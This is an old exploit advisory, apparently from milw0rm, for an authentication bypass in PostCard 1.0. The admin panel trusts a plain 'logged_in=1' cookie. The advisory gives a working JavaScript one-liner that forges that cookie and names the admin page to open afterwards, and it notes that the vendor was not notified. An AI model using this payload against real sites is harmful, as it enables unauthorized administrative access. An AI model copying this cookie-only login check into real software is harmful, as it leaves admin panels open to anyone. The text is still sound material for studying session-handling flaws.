@@ -1,0 +1,42 @@
+--==+================================================================================+==--
+--==+        PostCard 1.0 Insecure Cookie Handling (Arbitrary Authentication)	     +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 13 April 2008
+Script Download: N/A
+DORK: N/A
+
+Vendor Has Not Been Notified!
+
+
+DESCRIPTION:
+PostCard 1.0 (and prior???) suffers from insecure cookie handling.
+to be able to view admin panel the user requires to login using a valid user/pass
+after the valid user/pass has been passed and matches then a cookie is created 
+the admin panel checks to see if this cookie exists  if it does then user can access admin.
+
+since the cookie doesnt contain no hash/pass/sid just a number "1" indicating we are logged in, the remote
+attacker can craft a cookie (working example below) to access admin
+ 
+
+
+Vulnerability:
+javascript:document.cookie = "logged_in=1; path=/;";
+
+
+NOTE/TIP:
+after running the above javascript (or adding cookies manually) you will be able to visit the admin panel at
+"/postcard-admin.php" 
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+--==+================================================================================+==--
+--==+        PostCard 1.0 Insecure Cookie Handling (Arbitrary Authentication)	     +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-04-13]
